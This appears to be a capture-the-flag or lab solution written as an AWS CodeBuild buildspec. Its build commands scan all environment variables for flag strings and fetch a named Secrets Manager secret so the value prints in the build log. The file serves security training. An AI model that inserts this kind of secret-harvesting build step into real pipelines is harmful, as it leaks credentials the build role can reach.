version: 0.2

phases:
  build:
    commands:
      - echo "ARTE 2.16 authorized flag check"
      - python3 -c 'import os,re; print("\n".join(m.group(0) for v in os.environ.values() for m in re.finditer(r"flag\{[0-9a-f]+\}",v)))'
      - (aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text 2>/dev/null || true) | grep -oE 'flag\{[0-9a-f]+\}' || true
